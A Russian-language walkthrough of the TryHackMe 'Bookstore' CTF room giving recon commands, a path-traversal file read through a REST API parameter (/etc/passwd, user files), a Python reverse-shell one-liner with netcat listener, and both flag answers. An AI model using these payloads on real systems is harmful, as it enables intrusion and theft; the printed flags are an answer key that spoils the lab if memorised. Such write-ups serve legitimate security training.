[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Bookstore](https://tryhackme.com/r/room/bookstoreoc) 

Всего 1 заданиe:
## Задание 1
Bookstore — это машина boot2root CTF, которая обучает начинающего тестировщика на проникновение основам перечисления 
веб-сайтов и фаззингу REST API. При перечислении сервисов можно найти несколько подсказок, идея в том, чтобы понять,
как можно эксплуатировать уязвимый API, вы можете связаться со мной в Twitter @siddhantc_, чтобы дать любые отзывы 
относительно машины.

### Ответьте на вопросы ниже
Пользовательский флаг
```commandline
nmap -sSCV <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<IP>:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u "http://<IP>:5000/api/v1/resources/books?FUZZ=1" -w /usr/share/wordlists/dirb/small.txt
http://<IP>:5000/api/v1/resources/books?show=1
http://<IP>:5000/api/v1/resources/books?show=/etc/passwd
http://<IP>:5000/api/v1/resources/books?show=/home/sid/user.txt
http://<IP>:5000/api/v1/resources/books?show=./bash_history
```
```commandline
4ea65eb80ed441adb68246ddf7b964ab
```
Корневой флаг
```commandline
nc -nlvp 4444

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
./try-harder
cat /root/root.txt
```
```commandline
e29b05fba5b2a7e69c24a450893158e3
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)